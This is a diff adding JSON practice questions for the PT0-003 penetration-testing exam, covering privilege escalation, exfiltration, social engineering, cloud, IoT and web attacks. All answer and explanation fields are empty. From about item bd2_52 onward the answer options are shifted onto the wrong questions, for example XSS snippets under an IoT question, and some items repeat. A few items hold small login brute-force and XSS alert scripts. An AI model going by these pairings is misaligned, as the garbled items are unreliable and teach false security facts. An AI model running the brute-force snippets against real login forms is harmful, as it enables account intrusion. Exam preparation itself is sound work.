+      "id": "bd2_45",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, you have successfully gained access to an endpoint as a low-privileged user. You have identified a process running on the system that is used by a high-privileged user. Which of the following methods can you use for horizontal privilege escalation?",
+      "options": [
+        "A. const usernames = [\"user1\", \"user2\", \"user3\"]; const passwords = [\"pass1\", \"pass2\", \"pass3\"]; for (let i = 0; i < usernames.length; i++) { for (let j = 0; j < passwords.length; j++) { document.querySelector(\"#username\").value = usernames[i]; document.querySelector(\"#password\").value = passwords[j]; document.querySelector(\"form\").submit(); } }",
+        "B. const fs = require(\"fs\"); const fileContents = fs.readFileSync(\"loginData.txt\", \"utf-8\"); const credentials = fileContents.split(\"\\n\"); for (let i = 0; i < credentials.length; i++) { const [username, password] = credentials[i].split(\":\"); document.querySelector(\"#username\").value = username; document.querySelector(\"#password\").value = password; document.querySelector(\"form\").submit(); }",
+        "C. const usernames = [\"user1\", \"user2\", \"user3\"]; const passwords = [\"pass1\", \"pass2\", \"pass3\"]; usernames.forEach(username => { passwords.forEach(password => { document.querySelector(\"#username\").value = username; document.querySelector(\"#password\").value = password; document.querySelector(\"form\").submit(); }); });",
+        "D. const credentials = [ { username: \"user1\", password: \"pass1\" }, { username: \"user2\", password: \"pass2\" }, { username: \"user3\", password: \"pass3\" } ]; credentials.forEach(credential => { document.querySelector(\"#username\").value = credential.username; document.querySelector(\"#password\").value = credential.password; document.querySelector(\"form\").submit(); });"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_46",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A pen tester has successfully installed a trojan on a target system to create a persistent foothold. However, the trojan was detected and removed by the system’s antivirus software. The pen tester needs to find a way to reinstall the trojan without being detected. Which of the following is a technique the pen tester can use to avoid detection?",
+      "options": [
+        "A. Use the password hash to create a new user account on the domain controller",
+        "B. Use the password hash to authenticate to other systems and escalate privileges",
+        "C. Crack the password hash using a password-cracking tool",
+        "D. Use the password hash to decrypt encrypted files on the workstation"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_47",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have gained access to a company’s server through a vulnerability in their web application. You want to maintain access even after the system has been restarted. Which post-exploitation technique will you use to achieve this?",
+      "options": [
+        "A. Pass the hash",
+        "B. Token stealing",
+        "C. DLL hijacking",
+        "D. Over-pass-the-hash"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_48",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, the tester has successfully gained access to a company’s network and exfiltrated sensitive data. Which of the following techniques could the tester use to avoid detection during data exfiltration?",
+      "options": [
+        "A. Port scanning",
+        "B. Code obfuscation",
+        "C. SQL injection",
+        "D. Social engineering"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_49",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have successfully gained access to a system on a client’s network, and you want to cover your tracks. Which of the following techniques can you use to delete your tracks and logs from the system?",
+      "options": [
+        "A. Pass the hash",
+        "B. Trojan",
+        "C. Backdoor",
+        "D. Lateral movement"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_50",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester gains access to a company’s database through a vulnerability in its system. After accessing the database, the tester wants to ensure that any data exfiltration or any traces of their activities are not detected by the company’s security team. Which of the following post-exploitation techniques would help the tester in this situation?",
+      "options": [
+        "A. Uploading the data to a personal cloud storage account",
+        "B. Sending the data as an email attachment to a personal email account",
+        "C. Using a remote desktop connection to access the tester's personal computer and store the data",
+        "D. All of the above"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_51",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have successfully gained access to a target system on a network and are attempting to gather information about the users on the network. What tool can you use for enumerating users?",
+      "options": [
+        "A. Log poisoning",
+        "B. Command and control (C2) servers",
+        "C. Fileless malware",
+        "D. Rootkits"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_52",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has successfully exploited a Linux server and gained a low-privileged shell. The tester wants to enumerate the groups on the system to identify potential avenues for privilege escalation. Which of the following commands would be MOST useful for this task?",
+      "options": [
+        "A. Using port forwarding",
+        "B. Deploying honeypots",
+        "C. Employing steganography",
+        "D. Using brute force attacks"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_53",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, you have gained access to a single domain in a company’s Active Directory forest. You want to enumerate the entire forest to discover more information about the company’s infrastructure. Which post-exploitation technique can you use to achieve this goal?",
+      "options": [
+        "A. Netcat",
+        "B. Nmap",
+        "C. Metasploit",
+        "D. Enum4linux"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_54",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, you have gained access to a Windows server and found several unencrypted files containing sensitive information, including usernames and passwords. Which of the following post-exploitation techniques would you use to enumerate these files?",
+      "options": [
+        "A. ps aux",
+        "B. netstat -an",
+        "C. id",
+        "D. whoami"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_55",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are conducting a penetration test on a Linux system and have gained access to a low-privileged user account. You have determined that the system is running an outdated version of the Sudo package. What technique can you use to escalate your privileges on the system to root?",
+      "options": [
+        "A. Net command-line utility",
+        "B. DCSync",
+        "C. ARP spoofing",
+        "D. SQL injection"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_56",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a security assessment of a software application, you discovered that user input is not being properly sanitized, allowing for potential SQL injection attacks. Which of the following remediation recommendations should you include in your report?",
+      "options": [
+        "A. Searchsploit",
+        "B. Nmap",
+        "C. PowerSploit",
+        "D. Mimikatz"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_57",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a recent penetration test, you found that the company’s password policy allows users to set passwords that are only 4 characters long. Which of the following is the best recommendation to remediate this issue?",
+      "options": [
+        "A. Directory traversal",
+        "B. Buffer overflow",
+        "C. Sudo version downgrade",
+        "D. Dirty COW"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_58",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a large IT company, the same system administrator has been managing the critical financial database for several years without a break. Which remediation technique would BEST mitigate the risks associated with this situation?",
+      "options": [
+        "A. Recommend implementing a Web Application Firewall (WAF)",
+        "B. Recommend using a more secure cryptographic hash function to protect passwords",
+        "C. Recommend sanitizing all user input before passing it to the database",
+        "D. Recommend implementing two-factor authentication for all users"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_59",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester found that an application vulnerability allows unauthorized users to perform critical operations outside of business hours. What is the MOST appropriate remediation recommendation for this issue?",
+      "options": [
+        "A. Implement a password blacklist to prevent the use of commonly used passwords",
+        "B. Change the minimum password length to 8 characters, and force users to change their passwords at the next logon",
+        "C. Implement multifactor authentication to add an extra layer of security",
+        "D. Encrypt user passwords to protect them from being stolen in the event of a data breach"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_60",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a recent penetration test, the team found that a system administrator had been logged in continuously for the last two years without taking any leave. What recommendation should the team make to the organization as part of their remediation report?",
+      "options": [
+        "A. Job rotation",
+        "B. Separation of duties",
+        "C. Mandatory vacations",
+        "D. Background checks"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_61",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a recent security assessment, you found that an unauthorized individual gained access to a high-security area by tailgating an authorized employee. Which of the following biometric controls could be recommended to mitigate such an incident?",
+      "options": [
+        "A. Add additional authentication factors to the vulnerable operations",
+        "B. Patch the vulnerability in the application",
+        "C. Implement time-of-day restrictions for the vulnerable operations",
+        "D. Increase the logging and monitoring for the vulnerable operations"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_62",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration test scenario, a tester has discovered a website with a form that is vulnerable to cross-site scripting (XSS) attacks. The tester wants to demonstrate the vulnerability by injecting a script that displays an alert when the form is submitted. Which of the following JavaScript code snippets will accomplish this task?",
+      "options": [
+        "A. Implement mandatory vacations for all employees",
+        "B. Use multifactor authentication for all login attempts",
+        "C. Implement time-of-day restrictions for administrative access",
+        "D. Perform regular backups of critical system data"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_63",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a pen test engagement, a security analyst discovers that a smart thermostat communicates with the cloud service provider using HTTP instead of HTTPS. Which of the following is the MOST likely impact of this vulnerability?",
+      "options": [
+        "A. Fingerprint scanning",
+        "B. Facial recognition",
+        "C. Retina scanning",
+        "D. Voice recognition"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_64",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company has been using the same IoT devices for several years without updating the firmware or hardware. A security researcher discovered a critical vulnerability that could allow an attacker to gain unauthorized access to the devices. Which of the following is the BEST course of action?",
+      "options": [
+        "A. document.forms[0].onsubmit = function() {alert('XSS');};",
+        "B. document.forms[0].action = 'javascript:alert(\"XSS\");';",
+        "C. document.forms[0].innerHTML = 'alert(\"XSS\");';",
+        "D. document.write('alert(\"XSS\");');"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_65",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A smart home company has just released a new version of their mobile app that allows users to control their smart devices remotely. During a recent security assessment, a cybersecurity analyst discovered that the app is collecting more data than necessary, including the user’s location, phone contacts, and browsing history, and sending it to a third-party server. What type of vulnerability is this?",
+      "options": [
+        "A. An attacker can easily intercept and modify the data transmitted between the thermostat and the cloud service",
+        "B. An attacker can exploit a buffer overflow vulnerability in the thermostat to take control of it",
+        "C. An attacker can exploit a SQL injection vulnerability in the thermostat to steal data from the cloud service",
+        "D. An attacker can exploit a cross-site scripting vulnerability in the cloud service to steal data from the thermostat"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_66",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A water treatment plant has implemented a new SCADA system to monitor the water levels, temperature, and other parameters. The SCADA system is not configured securely, and an attacker has gained access to the system. The attacker has modified the water level readings, which could cause a serious problem. Which type of attack is this?",
+      "options": [
+        "A. Replace all the IoT devices with newer models",
+        "B. Update the firmware and hardware of the existing devices",
+        "C. Do nothing, as the devices have been working fine for years",
+        "D. Install additional security software to protect the devices"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_67",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A factory has deployed several IoT devices to automate its manufacturing processes. The devices are connected to the internet and have public IP addresses. Which of the following attacks is the factory vulnerable to?",
+      "options": [
+        "A. Insecure defaults",
+        "B. Cleartext communication",
+        "C. Outdated firmware/hardware",
+        "D. Data leakage"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_68",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "What is whaling in social engineering attacks?",
+      "options": [
+        "A. Denial-of-service (DoS) attack",
+        "B. Man-in-the-middle (MitM) attack",
+        "C. Data manipulation attack",
+        "D. Packet sniffing attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_69",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You receive an email from your bank asking you to update your account information. The email looks legitimate, with the bank logo and a link to a website that looks like the bank’s official website. What type of social engineering attack is this?",
+      "options": [
+        "A. Man-in-the-middle attack",
+        "B. Cross-site scripting attack",
+        "C. Distributed denial-of-service attack",
+        "D. Replay attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_70",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a vishing attack, the attacker poses as a trusted authority and solicits sensitive information over the phone. Which of the following is the most effective way to prevent vishing attacks?",
+      "options": [
+        "A. A type of spear phishing attack targeting senior executives",
+        "B. A type of phishing attack targeting bank accounts",
+        "C. A type of physical attack targeting employees",
+        "D. A type of password attack targeting social media accounts"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_71",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are a penetration tester and are conducting a social engineering attack against a company. You have found out that most of the employees of the company frequently visit a particular website that is related to the company’s industry. Which of the following attacks can you perform to target the company’s employees?",
+      "options": [
+        "A. Whaling",
+        "B. Phishing",
+        "C. Vishing",
+        "D. Spear phishing"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_72",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A social engineer tries to follow an employee into a secure area by pretending to be a delivery person. This is an example of:",
+      "options": [
+        "A. Implementing two-factor authentication",
+        "B. Avoiding all phone calls from unknown numbers",
+        "C. Training employees on vishing attack prevention and response",
+        "D. Using a strong antivirus software"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_73",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a recent penetration test, the security team found several sensitive documents and credentials for the organization in the dumpster outside the main building. Which of the following attacks was used to obtain these materials?",
+      "options": [
+        "A. Spear phishing",
+        "B. Vishing",
+        "C. Watering hole attack",
+        "D. Whaling"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_74",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration test, the tester successfully gains access to a domain controller through a privilege escalation attack. Which of the following post-exploitation techniques can be used to map out the network and discover high-value targets?",
+      "options": [
+        "A. Whaling attack",
+        "B. Spear phishing attack",
+        "C. Vishing attack",
+        "D. Tailgating attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_75",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration test, you have gained access to a Windows system using a known vulnerability. After exploiting the vulnerability, you want to extract clear text passwords stored in the system. Which of the following tools can help you extract clear text passwords?",
+      "options": [
+        "A. Shoulder surfing",
+        "B. Whaling",
+        "C. Spear phishing",
+        "D. Dumpster diving"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_76",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have successfully exploited a target system and gained administrative privileges. You want to use a post-exploitation tool to maintain access and control the compromised machine. Which of the following tools would be the BEST choice for this task?",
+      "options": [
+        "A. Burp Suite",
+        "B. BloodHound",
+        "C. Metasploit",
+        "D. Nessus"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_77",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "Which social engineering method is being used when an attacker creates a fake social media account and sends friend requests to targeted individuals?",
+      "options": [
+        "A. nmap",
+        "B. Mimikatz",
+        "C. Metasploit",
+        "D. Empire"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_78",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "An attacker sends an email to an employee at a company, claiming to be the CEO and requesting that the employee transfer a large sum of money to a designated bank account. The email states that this is an urgent matter and must be done immediately. What kind of social engineering attack is this?",
+      "options": [
+        "A. Burp Suite",
+        "B. Metasploit",
+        "C. Empire",
+        "D. Wireshark"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_79",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A hacker calls a target posing as a senior executive in the target company and asks for sensitive information. This type of attack is known as:",
+      "options": [
+        "A. Scarcity",
+        "B. Likeness",
+        "C. Authority",
+        "D. Urgency"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_80",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You receive an urgent call from an individual claiming to be from the IT department of your company. The caller requests your login credentials, stating that there is an emergency that requires immediate access to your account. What social engineering method is the caller attempting to use?",
+      "options": [
+        "A. Phishing",
+        "B. CEO fraud",
+        "C. Impersonation",
+        "D. Urgency"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_81",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A hacker is attempting to use the method of influence known as “scarcity” to trick an employee into giving them access to confidential information. Which of the following techniques would the hacker MOST likely use?",
+      "options": [
+        "A. Whaling",
+        "B. Spear Phishing",
+        "C. Vishing",
+        "D. Impersonation"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_82",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company employee receives a message on social media from a well-known influencer endorsing a new product. The influencer includes a discount code for the product and encourages the employee to try it out. The employee, who is familiar with the influencer and trusts their recommendations, clicks on the link to purchase the product. Which of the following social engineering methods is being used in this scenario?",
+      "options": [
+        "A. Phishing",
+        "B. Tailgating",
+        "C. Authority",
+        "D. Urgency"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_83",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are performing a penetration test on a company’s cloud infrastructure and have discovered that their IAM is misconfigured. Which of the following attacks would be most effective in this scenario?",
+      "options": [
+        "A. Offering to exchange confidential information in return for access",
+        "B. Claiming that the requested information is in limited supply",
+        "C. Threatening to damage the company's reputation if access is not granted",
+        "D. Offering to pay the employee a large sum of money for access"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_84",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are performing a penetration test on a company’s cloud infrastructure and discover that they are using Docker for their containerization technology. You decide to test for misconfigured assets and find that you can download a configuration file for their Kubernetes cluster by exploiting an unprotected API. Which of the following is the MOST likely risk this poses to the company?",
+      "options": [
+        "A. Scarcity",
+        "B. Authority",
+        "C. Social proof",
+        "D. Familiarity"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_85",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a mobile application, a developer used a third-party library for encryption purposes. During the assessment, the security analyst found that the encryption key used in the third-party library is hardcoded in the source code. What attack could the attacker perform by decompiling the application code?",
+      "options": [
+        "A. Cross-site scripting (XSS)",
+        "B. Distributed denial of service (DDoS)",
+        "C. Dictionary attack",
+        "D. Password spraying"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_86",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A cloud service provider has implemented two-factor authentication to prevent account takeover. Which of the following is the most effective second factor to use for authentication?",
+      "options": [
+        "A. Data exfiltration",
+        "B. Unauthorized access to the container",
+        "C. Denial of service (DoS)",
+        "D. All of the above"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_87",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "An attacker is attempting to launch a metadata service attack to gain access to sensitive information in a cloud environment. What can the cloud administrator do to prevent this type of attack?",
+      "options": [
+        "A. Data leakage",
+        "B. Reverse engineering",
+        "C. Code injection",
+        "D. Memory manipulation"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_88",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network to identify the operating system running on a target host. The target host is protected by a firewall that blocks all incoming ICMP packets. Type the nmap command to perform the scan and complete the task.",
+      "options": [
+        "A. SMS code sent to the user's mobile phone",
+        "B. Biometric verification, such as fingerprint or face recognition",
+        "C. A password sent via email to the user's email address",
+        "D. Security questions, such as mother's maiden name or favorite pet"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd2_89",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "Type the nmap command to perform a vulnerability scan on a target network to identify the software running on the target hosts.",
+      "options": [
+        "A. Disable the metadata service entirely",
+        "B. Limit access to the metadata service to only trusted IP addresses",
+        "C. Encrypt the sensitive information in the metadata service",
+        "D. Use strong passwords for all user accounts in the cloud environment"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_1",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "An attacker is attempting to launch a metadata service attack to gain access to sensitive information in a cloud environment. What can the cloud administrator do to prevent this type of attack?",
+      "options": [
+        "A. Disable the metadata service entirely",
+        "B. Limit access to the metadata service to only trusted IP addresses",
+        "C. Encrypt the sensitive information in the metadata service",
+        "D. Use strong passwords for all user accounts in the cloud environment"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_2",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A cloud service provider has implemented two-factor authentication to prevent account takeover. Which of the following is the most effective second factor to use for authentication?",
+      "options": [
+        "A. SMS code sent to the user's mobile phone",
+        "B. Biometric verification, such as fingerprint or face recognition",
+        "C. A password sent via email to the user's email address",
+        "D. Security questions, such as mother's maiden name or favorite pet"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_3",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are performing a penetration test on a cloud-based application that stores sensitive customer data. During your testing, you discover a vulnerability in the platform’s access controls that would allow an attacker to escalate their privileges and gain administrative access. Which of the following actions should you take next?",
+      "options": [
+        "A. Immediately exploit the vulnerability to gain administrative access and document your findings",
+        "B. Report the vulnerability to the cloud service provider and provide detailed steps to reproduce the issue",
+        "C. Attempt to fix the vulnerability yourself to prevent attackers from exploiting it in the future",
+        "D. Ignore the vulnerability as it is not critical to the security of the application"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_4",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A hacker is targeting an organization’s cloud infrastructure by using phishing emails to trick employees into entering their login credentials on a fake website. Which of the following types of credential harvesting attacks is being used?",
+      "options": [
+        "A. Password spraying",
+        "B. Keylogging",
+        "C. Credential stuffing",
+        "D. Spear phishing"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_5",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are conducting a penetration test on a web application using OWASP Zed Attack Proxy. Which of the following is a limitation of OWASP ZAP that you should be aware of during the test?",
+      "options": [
+        "A. OWASP ZAP can only scan web applications hosted on Linux servers",
+        "B. OWASP ZAP cannot detect vulnerabilities in web services",
+        "C. OWASP ZAP can only be used with web applications that are written in Java",
+        "D. OWASP ZAP cannot scan web applications that require authentication"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_6",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company has an employee portal where employees can access their pay stubs and personal information. The portal uses a web application that is vulnerable to a directory traversal attack. An attacker is able to gain access to employee records by manipulating the URL. Which of the following is the best way to prevent directory traversal attacks?",
+      "options": [
+        "A. Implementing a web application firewall",
+        "B. Using strong encryption algorithms",
+        "C. Enforcing strict password policies",
+        "D. Sanitizing user input"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_7",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A user reports that their online banking session was hijacked, and unauthorized transactions were made from their account. The security team’s investigation reveals that the attacker used a tool to intercept and replay the user’s session, which allowed them to gain access to the user’s account. What type of attack was used in this scenario?",
+      "options": [
+        "A. Session fixation",
+        "B. Session hijacking",
+        "C. Session replay",
+        "D. Cross-site request forgery (CSRF)"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_8",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A pen tester has identified an application that requires a login with low-level user privileges. The tester discovers that the application is running with admin-level permissions, and decides to attempt privilege escalation. Which of the following best describes the potential impact of a successful privilege escalation attack?",
+      "options": [
+        "A. The attacker gains access to sensitive data stored on the target system",
+        "B. The attacker can modify the system's configuration settings",
+        "C. The attacker can execute arbitrary code on the system",
+        "D. The attacker can impersonate other users on the system"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_9",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company’s web application uses a cookie to store session information. Which type of attack is most likely to be successful against this application?",
+      "options": [
+        "A. SQL injection",
+        "B. Cross-site scripting (XSS)",
+        "C. Cross-site request forgery (CSRF)",
+        "D. Session hijacking"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_10",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a security assessment, you discover that an application provides detailed error messages, which contain sensitive information such as usernames and passwords. What type of vulnerability would you classify this as?",
+      "options": [
+        "A. Lack of input validation",
+        "B. Insufficient logging and monitoring",
+        "C. Cross-site scripting",
+        "D. Lack of error handling"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_11",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a web application that allows multiple users to upload files, a security analyst has discovered that it’s possible to upload a file with the same name as an existing one. Which of the following vulnerabilities can be exploited in this scenario?",
+      "options": [
+        "A. Cross-Site Request Forgery (CSRF)",
+        "B. Remote File Inclusion (RFI)",
+        "C. Server-Side Request Forgery (SSRF)",
+        "D. Race conditions"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_12",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As a security analyst, you are conducting a penetration test for a client’s web application that uses LDAP for user authentication. After performing a thorough reconnaissance, you discover that the login form is vulnerable to LDAP injection attacks. What is the potential impact of a successful LDAP injection attack?",
+      "options": [
+        "A. Execution of arbitrary code on the server",
+        "B. Theft of user credentials",
+        "C. Unauthorized access to sensitive data",
+        "D. Modification of the web application's functionality"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_13",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As a security analyst, you are performing a web application penetration test for a client. During the assessment, you notice that the search functionality on the website is vulnerable to reflected cross-site scripting. Which of the following best describes a possible attack scenario for this vulnerability?",
+      "options": [
+        "A. The attacker injects malicious code into the search box, which is reflected back to the victim's browser",
+        "B. The attacker gains access to the website's database and modifies the search results to include malicious code",
+        "C. The attacker sends a specially crafted email to the victim containing a link to the vulnerable website",
+        "D. The attacker gains access to the victim's cookies and uses them to hijack the victim's session"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_14",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "Which of the following BEST describes the impact of a persistent cross-site scripting (XSS) attack on a web application?",
+      "options": [
+        "A. The attacker can steal sensitive data from the web application",
+        "B. The attacker can execute arbitrary commands on the server hosting the web application",
+        "C. The attacker can hijack user sessions and perform actions on behalf of the user",
+        "D. The attacker can deface the website by modifying its content"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_15",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In the context of web application security, what is a persistent cross-site scripting (XSS) attack?",
+      "options": [
+        "A. An attack that allows an attacker to inject malicious scripts into a web application that are executed every time the application is accessed",
+        "B. An attack that allows an attacker to inject malicious scripts into a web application that are executed only once",
+        "C. An attack that allows an attacker to steal sensitive data by modifying the content of web pages",
+        "D. An attack that allows an attacker to redirect users to a malicious website"
